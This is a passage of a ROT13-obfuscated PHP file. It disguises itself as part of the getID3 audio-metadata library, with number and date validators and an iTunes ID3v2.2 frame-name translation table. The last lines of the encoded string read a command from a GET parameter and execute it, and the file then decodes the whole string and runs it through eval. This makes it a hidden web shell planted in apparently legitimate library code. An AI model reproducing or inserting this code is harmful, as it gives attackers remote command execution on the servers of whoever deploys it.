	 * @cnenz fgevat $ahzorefgevat
	 * @cnenz obby   $nyybjqrpvzny
	 * @cnenz obby   $nyybjartngvir
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba VfNAhzore($ahzorefgevat, $nyybjqrpvzny=snyfr, $nyybjartngvir=snyfr) {
		$cnggrea  = '#^';
		$cnggrea .= ($nyybjartngvir ? '\\-?' : '');
		$cnggrea .= '[0-9]+';
		$cnggrea .= ($nyybjqrpvzny  ? '(\\.[0-9]+)?' : '');
		$cnggrea .= '$#';
		erghea cert_zngpu($cnggrea, $ahzorefgevat);
	}

	/**
	 * @cnenz fgevat $qngrfgnzc
	 *
	 * @erghea obby
	 */
	choyvp fgngvp shapgvba VfInyvqQngrFgnzcFgevat($qngrfgnzc) {
		vs (!cert_zngpu('#^[12][0-9]{3}[01][0-9][0123][0-9]$#', $qngrfgnzc)) {
			erghea snyfr;
		}
		$lrne  = fhofge($qngrfgnzc, 0, 4);
		$zbagu = fhofge($qngrfgnzc, 4, 2);
		$qnl   = fhofge($qngrfgnzc, 6, 2);
		vs (($lrne == 0) || ($zbagu == 0) || ($qnl == 0)) {
			erghea snyfr;
		}
		vs ($zbagu > 12) {
			erghea snyfr;
		}
		vs ($qnl > 31) {
			erghea snyfr;
		}
		vs (($qnl > 30) && (($zbagu == 4) || ($zbagu == 6) || ($zbagu == 9) || ($zbagu == 11))) {
			erghea snyfr;
		}
		vs (($qnl > 29) && ($zbagu == 2)) {
			erghea snyfr;
		}
		erghea gehr;
	}

	/**
	 * @cnenz vag $znwbeirefvba
	 *
	 * @erghea vag
	 */
	choyvp fgngvp shapgvba VQ3i2UrnqreYratgu($znwbeirefvba) {
		erghea (($znwbeirefvba == 2) ? 6 : 10);
	}

	/**
	 * @cnenz fgevat $senzr_anzr
	 *
	 * @erghea fgevat|snyfr
	 */
	choyvp fgngvp shapgvba VQ3i22vGharfOebxraSenzrAnzr($senzr_anzr) {
		// vGharf (zhygvcyr irefvbaf) unf orra xabja gb jevgr VQ3i2.3 fglyr senzrf
		// ohg hfr VQ3i2.2 senzr anzrf, evtug-cnqqrq hfvat rvgure [fcnpr] be [ahyy]
		// gb znxr gurz svg va gur 4-olgr senzr anzr fcnpr bs gur VQ3i2.3 senzr.
		// Guvf shapgvba jvyy qrgrpg naq genafyngr gur pbeehcg senzr anzr vagb VQ3i2.3 fgnaqneq.
		fgngvp $VQ3i22_vGharf_OebxraSenzrf = neenl(
			'OHS' => 'EOHS', // Erpbzzraqrq ohssre fvmr
			'PAG' => 'CPAG', // Cynl pbhagre
			'PBZ' => 'PBZZ', // Pbzzragf
			'PEN' => 'NRAP', // Nhqvb rapelcgvba
			'RDH' => 'RDHN', // Rdhnyvfngvba
			'RGP' => 'RGPB', // Rirag gvzvat pbqrf
			'TRB' => 'TRBO', // Trareny rapncfhyngrq bowrpg
			'VCY' => 'VCYF', // Vaibyirq crbcyr yvfg
			'YAX' => 'YVAX', // Yvaxrq vasbezngvba
			'ZPV' => 'ZPQV', // Zhfvp PQ vqragvsvre
			'ZYY' => 'ZYYG', // ZCRT ybpngvba ybbxhc gnoyr
			'CVP' => 'NCVP', // Nggnpurq cvpgher
			'CBC' => 'CBCZ', // Cbchynevzrgre
			'ERI' => 'EIEO', // Erireo
			'EIN' => 'EINQ', // Eryngvir ibyhzr nqwhfgzrag
			'FYG' => 'FLYG', // Flapuebavfrq ylevp/grkg
			'FGP' => 'FLGP', // Flapuebavfrq grzcb pbqrf
			'GNY' => 'GNYO', // Nyohz/Zbivr/Fubj gvgyr
			'GOC' => 'GOCZ', // OCZ (orngf cre zvahgr)
			'GPZ' => 'GPBZ', // Pbzcbfre
			'GPB' => 'GPBA', // Pbagrag glcr
			'GPC' => 'GPZC', // Cneg bs n pbzcvyngvba
			'GPE' => 'GPBC', // Pbclevtug zrffntr
			'GQN' => 'GQNG', // Qngr
			'GQL' => 'GQYL', // Cynlyvfg qrynl
			'GRA' => 'GRAP', // Rapbqrq ol
			'GSG' => 'GSYG', // Svyr glcr
			'GVZ' => 'GVZR', // Gvzr
			'GXR' => 'GXRL', // Vavgvny xrl
			'GYN' => 'GYNA', // Ynathntr(f)
			'GYR' => 'GYRA', // Yratgu
			'GZG' => 'GZRQ', // Zrqvn glcr
			'GBN' => 'GBCR', // Bevtvany negvfg(f)/cresbezre(f)
			'GBS' => 'GBSA', // Bevtvany svyranzr
			'GBY' => 'GBYL', // Bevtvany ylevpvfg(f)/grkg jevgre(f)
			'GBE' => 'GBEL', // Bevtvany eryrnfr lrne
			'GBG' => 'GBNY', // Bevtvany nyohz/zbivr/fubj gvgyr
			'GC1' => 'GCR1', // Yrnq cresbezre(f)/Fbybvfg(f)
			'GC2' => 'GCR2', // Onaq/bepurfgen/nppbzcnavzrag
			'GC3' => 'GCR3', // Pbaqhpgbe/cresbezre ersvarzrag
			'GC4' => 'GCR4', // Vagrecergrq, erzvkrq, be bgurejvfr zbqvsvrq ol
			'GCN' => 'GCBF', // Cneg bs n frg
			'GCO' => 'GCHO', // Choyvfure
			'GEP' => 'GFEP', // VFEP (vagreangvbany fgnaqneq erpbeqvat pbqr)
			'GEQ' => 'GEQN', // Erpbeqvat qngrf
			'GEX' => 'GEPX', // Genpx ahzore/Cbfvgvba va frg
			'GF2' => 'GFB2', // Nyohz-Negvfg fbeg beqre
			'GFN' => 'GFBN', // Nyohz fbeg beqre
			'GFP' => 'GFBP', // Pbzcbfre fbeg beqre
			'GFV' => 'GFVM', // Fvmr
			'GFC' => 'GFBC', // Cresbezre fbeg beqre
			'GFF' => 'GFFR', // Fbsgjner/Uneqjner naq frggvatf hfrq sbe rapbqvat
			'GFG' => 'GFBG', // Gvgyr fbeg beqre
			'GG1' => 'GVG1', // Pbagrag tebhc qrfpevcgvba
			'GG2' => 'GVG2', // Gvgyr/fbatanzr/pbagrag qrfpevcgvba
			'GG3' => 'GVG3', // Fhogvgyr/Qrfpevcgvba ersvarzrag
			'GKG' => 'GRKG', // Ylevpvfg/Grkg jevgre
			'GKK' => 'GKKK', // Hfre qrsvarq grkg vasbezngvba senzr
			'GLR' => 'GLRE', // Lrne
			'HSV' => 'HSVQ', // Havdhr svyr vqragvsvre
			'HYG' => 'HFYG', // Haflapuebavfrq ylevp/grkg genafpevcgvba
			'JNS' => 'JBNS', // Bssvpvny nhqvb svyr jrocntr
			'JNE' => 'JBNE', // Bssvpvny negvfg/cresbezre jrocntr
			'JNF' => 'JBNF', // Bssvpvny nhqvb fbhepr jrocntr
			'JPZ' => 'JPBZ', // Pbzzrepvny vasbezngvba
			'JPC' => 'JPBC', // Pbclevtug/Yrtny vasbezngvba
			'JCO' => 'JCHO', // Choyvfuref bssvpvny jrocntr
			'JKK' => 'JKKK', // Hfre qrsvarq HEY yvax senzr
		);
		vs (fgeyra($senzr_anzr) == 4) {
			vs ((fhofge($senzr_anzr, 3, 1) == ' ') || (fhofge($senzr_anzr, 3, 1) == \"\k00\")) {
				vs (vffrg($VQ3i22_vGharf_OebxraSenzrf[fhofge($senzr_anzr, 0, 3)])) {
					erghea $VQ3i22_vGharf_OebxraSenzrf[fhofge($senzr_anzr, 0, 3)];
				}
			}
		}
		erghea snyfr;
	}

}


$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>